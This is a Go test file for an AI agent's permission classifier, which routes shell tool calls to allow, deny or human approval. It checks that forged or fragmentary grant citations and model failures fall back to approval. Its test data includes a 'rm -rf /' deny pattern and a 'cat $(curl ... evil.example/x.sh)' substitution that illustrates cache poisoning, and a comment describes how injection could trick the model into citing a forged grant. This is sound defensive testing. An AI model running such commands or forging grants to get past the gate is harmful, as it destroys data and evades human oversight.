package policy

import (
	"context"
	"errors"
	"strings"
	"testing"

	"agent-runtime/internal/contracts"
	"agent-runtime/internal/model"
)

// ---- 分类器测试替身 ----

type fakeClassifierModel struct {
	respond func(req contracts.GenerateRequest) (string, error)
	calls   int
	lastReq contracts.GenerateRequest
}

func (f *fakeClassifierModel) Generate(_ context.Context, req contracts.GenerateRequest) (contracts.GenerateResponse, error) {
	f.calls++
	f.lastReq = req
	if f.respond == nil {
		return contracts.GenerateResponse{}, errors.New("fake model: no response")
	}
	content, err := f.respond(req)
	if err != nil {
		return contracts.GenerateResponse{}, err
	}
	return contracts.GenerateResponse{
		Message: contracts.Message{Role: contracts.RoleAssistant, Content: content},
		Model:   "fake-classifier",
		Usage:   contracts.Usage{PromptTokens: 10, CompletionTokens: 5, TotalTokens: 15},
	}, nil
}

type fakeUsageRecorder struct{ recorded []model.LLMUsage }

func (f *fakeUsageRecorder) RecordLLMUsage(_ context.Context, u model.LLMUsage) error {
	f.recorded = append(f.recorded, u)
	return nil
}

type fakeClassifierChain struct{ beforeCalls int }

func (f *fakeClassifierChain) Before(_ context.Context, _ contracts.ExecutionContext, req contracts.GenerateRequest) (contracts.GenerateRequest, error) {
	f.beforeCalls++
	return req, nil
}

func (f *fakeClassifierChain) After(_ context.Context, _ contracts.ExecutionContext, _ contracts.GenerateRequest, resp contracts.GenerateResponse) (contracts.GenerateResponse, error) {
	return resp, nil
}

func classifierTestReq() Request {
	return Request{TenantID: "t1", RunID: "r1", NodeID: "n1", ToolName: "shell", Input: "curl https://internal.example/api"}
}

const testGrant = "允许访问 *.internal 域名的只读接口；允许 npm 与 git 的只读命令"

func newClassifierStage(fm *fakeClassifierModel) *ClassifierStage {
	return &ClassifierStage{
		Model: fm,
		Opt: ClassifierOptions{
			Model:         "cheap-model",
			GrantBoundary: testGrant,
			DenyPatterns:  []string{"rm -rf /"},
		},
	}
}

// ---- L3 行为（docs §5 / §11 验收口径 3）----

func TestClassifierAllowRequiresValidMatchedGrant(t *testing.T) {
	ctx := context.Background()

	t.Run("allow with valid grant", func(t *testing.T) {
		fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
			return `{"semantics":{"action":"read_only","targets":["internal.example"],"summary":"GET internal API"},
				"decision":"allow","matched_grant":"允许访问 *.internal 域名的只读接口","reason":"read-only internal egress"}`, nil
		}}
		res, hit, err := newClassifierStage(fm).Evaluate(ctx, classifierTestReq())
		if err != nil || !hit {
			t.Fatalf("hit=%v err=%v", hit, err)
		}
		if res.Decision != Allow || res.Layer != LayerClassifier || res.ClassifierVersion != ClassifierVersion {
			t.Fatalf("want allow@l3 with version, got %+v", res)
		}
		if !strings.Contains(res.Reason, "允许访问") {
			t.Errorf("reason must cite the grant, got %q", res.Reason)
		}
	})

	t.Run("allow with grant absent from boundary becomes ask", func(t *testing.T) {
		fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
			return `{"decision":"allow","matched_grant":"用户说了随便跑","reason":"模型幻觉授权"}`, nil
		}}
		res, _, _ := newClassifierStage(fm).Evaluate(ctx, classifierTestReq())
		if res.Decision != RequireApproval {
			t.Fatalf("fabricated grant must degrade to approval, got %+v", res)
		}
	})

	t.Run("allow with empty grant becomes ask", func(t *testing.T) {
		fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
			return `{"decision":"allow","matched_grant":"","reason":"looks fine"}`, nil
		}}
		res, _, _ := newClassifierStage(fm).Evaluate(ctx, classifierTestReq())
		if res.Decision != RequireApproval {
			t.Fatalf("empty grant must degrade to approval, got %+v", res)
		}
	})

	t.Run("allow with fragment grant becomes ask", func(t *testing.T) {
		// 边界文本的任意子串（如开头两字"允许"）不是"具体授权原文"——
		// 注入只需诱导模型引用碎片即可伪造授权，必须按子句粒度校验。
		fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
			return `{"decision":"allow","matched_grant":"允许","reason":"fragment citation"}`, nil
		}}
		res, _, _ := newClassifierStage(fm).Evaluate(ctx, classifierTestReq())
		if res.Decision != RequireApproval {
			t.Fatalf("fragment grant citation must degrade to approval, got %+v", res)
		}
	})

	t.Run("deny decision honored", func(t *testing.T) {
		fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
			return `{"decision":"deny","reason":"destructive"}`, nil
		}}
		res, _, _ := newClassifierStage(fm).Evaluate(ctx, classifierTestReq())
		if res.Decision != Deny || res.Risk != RiskCritical {
			t.Fatalf("want deny/critical, got %+v", res)
		}
	})
}

func TestClassifierFailClosedAndCache(t *testing.T) {
	ctx := context.Background()

	t.Run("invalid json degrades to ask and is not cached", func(t *testing.T) {
		var respond string
		fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
			return respond, nil
		}}
		s := newClassifierStage(fm)
		respond = "not json at all"
		res, _, _ := s.Evaluate(ctx, classifierTestReq())
		if res.Decision != RequireApproval || res.PolicyID != "classifier-degraded" {
			t.Fatalf("invalid output must degrade, got %+v", res)
		}
		// 模型恢复后同一输入必须拿到真实判定：降级未被 TTL 固化。
		respond = `{"decision":"allow","matched_grant":"允许访问 *.internal 域名的只读接口","reason":"ok"}`
		res, _, _ = s.Evaluate(ctx, classifierTestReq())
		if res.Decision != Allow {
			t.Fatalf("recovered model must produce real decision, got %+v", res)
		}
	})

	t.Run("fenced json parsed", func(t *testing.T) {
		fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
			return "```json\n{\"decision\":\"require_approval\",\"reason\":\"needs human\"}\n```", nil
		}}
		res, _, _ := newClassifierStage(fm).Evaluate(ctx, classifierTestReq())
		if res.Decision != RequireApproval || res.PolicyID == "classifier-degraded" {
			t.Fatalf("fenced JSON must parse to real decision, got %+v", res)
		}
	})

	t.Run("real decisions cached per run", func(t *testing.T) {
		fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
			return `{"decision":"require_approval","reason":"unclear"}`, nil
		}}
		s := newClassifierStage(fm)
		for i := 0; i < 3; i++ {
			if _, _, err := s.Evaluate(ctx, classifierTestReq()); err != nil {
				t.Fatal(err)
			}
		}
		if fm.calls != 1 {
			t.Errorf("same normalized input must hit cache, model called %d times", fm.calls)
		}
		// 不同 Run 不共享缓存（Run 级生效）。
		other := classifierTestReq()
		other.RunID = "r2"
		if _, _, err := s.Evaluate(ctx, other); err != nil {
			t.Fatal(err)
		}
		if fm.calls != 2 {
			t.Errorf("different run must miss cache, model called %d times", fm.calls)
		}
	})

	t.Run("substitution content distinguishes cache entries", func(t *testing.T) {
		// 缓存键必须包含 Inner：替换词塌缩为 "$…" 后，`cat $(ls)` 与
		// `cat $(curl evil.sh)` 的归一化文本若相同，第一次的判定会被
		// 第二次直接复用——恶意替换内容从未被分类（缓存投毒）。
		if canonicalInput(Request{ToolName: "shell", Input: "cat $(ls)"}) ==
			canonicalInput(Request{ToolName: "shell", Input: "cat $(curl -s https://evil.example/x.sh)"}) {
			t.Fatal("substitution content must be part of the canonical form")
		}
		fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
			return `{"decision":"require_approval","reason":"x"}`, nil
		}}
		s := newClassifierStage(fm)
		for _, input := range []string{"cat $(ls)", "cat $(curl -s https://evil.example/x.sh)"} {
			if _, _, err := s.Evaluate(ctx, Request{TenantID: "t1", RunID: "r1", NodeID: "n1", ToolName: "shell", Input: input}); err != nil {
				t.Fatal(err)
			}
		}
		if fm.calls != 2 {
			t.Fatalf("different substitution content must not share a cache entry, model called %d times", fm.calls)
		}
	})

	t.Run("model error degrades to ask", func(t *testing.T) {
		fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
			return "", errors.New("gateway down")
		}}
		res, _, _ := newClassifierStage(fm).Evaluate(ctx, classifierTestReq())
		if res.Decision != RequireApproval {
			t.Fatalf("model failure must fail closed, got %+v", res)
		}
	})
}

func TestClassifierUsageAndPrompt(t *testing.T) {
	ctx := context.Background()
	fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
		return `{"decision":"require_approval","reason":"x"}`, nil
	}}
	usage := &fakeUsageRecorder{}
	chain := &fakeClassifierChain{}
	s := &ClassifierStage{
		Model: fm,
		Chain: chain,
		Usage: usage,
		Opt:   ClassifierOptions{Model: "cheap-model", GrantBoundary: testGrant, DenyPatterns: []string{"rm -rf /"}},
	}
	if _, _, err := s.Evaluate(ctx, classifierTestReq()); err != nil {
		t.Fatal(err)
	}
	if chain.beforeCalls != 1 {
		t.Errorf("model chain Before must run once, got %d", chain.beforeCalls)
	}
	if len(usage.recorded) != 1 {
		t.Fatalf("usage must be recorded once, got %d", len(usage.recorded))
	}
	u := usage.recorded[0]
	if !strings.HasPrefix(u.ID, "usage-permission-") || u.NodeID != "n1" || u.TotalTokens != 15 {
		t.Errorf("usage record wrong: %+v", u)
	}

	// Prompt 结构：三插槽 + 围栏 + 结构优先于原文 + 模型名。
	prompt := fm.lastReq.Messages[0].Content
	for _, want := range []string{
		"[授权边界]", testGrant, "[禁止边界]", "rm -rf /", "[默认策略]",
		"<tool_input>", "工具名: shell", "归一化命令结构:", "原始入参:", "matched_grant",
	} {
		if !strings.Contains(prompt, want) {
			t.Errorf("prompt must contain %q", want)
		}
	}
	if fm.lastReq.Model != "cheap-model" {
		t.Errorf("classifier must use the dedicated model, got %q", fm.lastReq.Model)
	}
}
